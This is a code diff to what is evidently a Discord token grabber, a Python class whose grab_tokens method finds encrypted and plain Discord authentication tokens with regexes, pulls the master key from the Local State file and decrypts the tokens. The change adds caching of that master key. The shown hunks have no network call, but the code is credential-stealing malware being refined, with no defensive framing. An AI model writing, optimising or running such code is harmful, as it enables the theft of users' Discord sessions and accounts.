@@ -17,6 +17,7 @@ class Discord(object):
         self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
         self.unencrypted_regex = r"[\w-]{24,}\.[\w-]{6}\.[\w-]{27,}"
         self.tokens = []
+        self._master_keys = {}
 
         self.grab_tokens()
 
@@ -96,6 +97,11 @@ class Discord(object):
             decrypted = decrypted[:-padding_len]
         return decrypted.decode("utf-8", errors="ignore")
 
+    def cached_master_key(self, path):
+        if path not in self._master_keys:
+            self._master_keys[path] = self.get_master_key(path)
+        return self._master_keys[path]
+
     def grab_tokens(self):
         paths = self._get_discord_paths()
 
@@ -124,7 +130,7 @@ class Discord(object):
                         for y in re.findall(self.encrypted_regex, line):
                             try:
                                 raw = base64.b64decode(y.split('dQw4w9WgXcQ:')[1])
-                                master_key = self.get_master_key(local_state)
+                                master_key = self.cached_master_key(local_state)
 
                                 if not IS_WINDOWS and raw[:3] in (b"v10", b"v11"):
                                     token = self._decrypt_linux_v10(raw, master_key)
